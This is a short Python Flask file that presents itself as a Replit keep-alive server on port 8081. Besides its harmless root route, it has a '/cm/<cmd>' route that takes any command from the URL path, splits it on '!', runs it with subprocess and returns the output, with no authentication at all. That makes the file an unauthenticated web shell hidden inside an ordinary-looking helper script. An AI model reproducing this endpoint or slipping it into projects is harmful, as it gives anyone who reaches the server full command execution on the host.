from flask import Flask
#File management
import os

#Threading
from threading import Thread

#WSGIServer
from gevent.pywsgi import WSGIServer


import subprocess
import tempfile

app = Flask(__name__)

def run():
	#WSGIServer
	WSGIServer(('', 8081), app).serve_forever()

#Thread
def keep_alive():
	t = Thread(target=run)
	t.start()

@app.route("/")
def root():
	return "replit ⠕"

@app.route("/cm/<cmd>")
def cm(cmd):
	with tempfile.TemporaryFile() as tempf:
		cmd = cmd.split("!")
		print(cmd)
		proc = subprocess.Popen(cmd, stdout=tempf)
		proc.wait()
		tempf.seek(0)
		return tempf.read()
	return ""

if __name__ == '__main__':
	#Run server forever
	keep_alive()